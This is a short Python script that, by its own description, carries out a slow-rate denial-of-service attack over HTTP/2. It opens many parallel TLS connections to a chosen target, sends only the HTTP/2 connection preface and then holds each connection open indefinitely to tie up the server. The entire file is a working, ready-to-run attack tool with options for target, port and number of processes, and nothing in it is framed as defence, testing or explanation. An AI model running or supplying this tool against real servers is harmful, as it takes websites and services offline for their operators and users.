#!/usr/bin/python3
import socket
import ssl
import h2.connection
import argparse
import time
from multiprocessing import Process

def establish_tls_connection(host, port):
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        return tls_sock
    except Exception as e:
        print(f"Error establishing TLS connection: {e}")
        exit(1)

def send_connection_preface_only(tls_sock):
    try:
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        
        tls_sock.sendall(conn.data_to_send())
        print("Connection preface sent. Server is waiting for an HTTP request...")

        while True:
            time.sleep(10)
    except Exception as e:
        print(f"Error during the attack: {e}")
    finally:
        tls_sock.close()

def main():
    tls_sock = establish_tls_connection(args.target, args.port)
    send_connection_preface_only(tls_sock)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a Slow Rate DoS attack using Connection Preface over HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")

    args = parser.parse_args()

    process_list = []

    for i in range(args.process):
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()
        time.sleep(args.delay)

    for process in process_list:
        if process.is_alive():
            process.join()
